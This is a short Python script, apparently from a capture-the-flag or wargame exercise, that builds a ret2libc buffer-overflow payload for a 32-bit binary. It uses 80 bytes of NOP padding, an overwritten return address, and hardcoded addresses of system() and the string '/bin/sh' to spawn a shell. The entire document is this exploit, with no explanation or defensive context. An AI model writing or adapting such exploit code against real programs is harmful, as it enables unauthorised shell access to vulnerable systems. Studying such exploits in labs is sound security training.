import struct

# buffer overflow offset is 80
padding = "\x90" * 80

p_return_adress = 0x0804853e
main_return_adress = 0x0804854b

ret_adress = str(struct.pack("I", p_return_adress))
system = str(struct.pack("I", 0xb7e6b060))
returnAfterSystem = str(struct.pack("I", 0xb7e5ebe0))
bin_sh = str(struct.pack("I", 0xb7f8cc58)) # /bin/sh

payload = padding + ret_adress + system + returnAfterSystem +  bin_sh
print(payload)